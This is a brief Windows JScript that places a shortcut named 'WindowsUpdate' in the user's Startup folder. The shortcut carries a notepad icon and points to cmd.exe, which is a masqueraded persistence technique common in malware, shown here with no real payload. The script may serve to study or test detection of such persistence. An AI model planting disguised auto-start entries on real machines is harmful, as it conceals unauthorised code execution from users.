var fso = new ActiveXObject("Scripting.FileSystemObject");
var WshShell = WScript.CreateObject("WScript.Shell");



	
strDesktop = WshShell.SpecialFolders("Startup");
 var aa = WshShell.CreateShortcut(strDesktop + "\\WindowsUpdate.lnk");
aa.TargetPath = "C:\\Windows\\System32\\cmd.exe"
aa.Arguments = ""
aa.Description = "WindowsUpdate";
aa.IconLocation = "C:\\Windows\\notepad.exe"
aa.WorkingDirectory = "";
aa.Save();
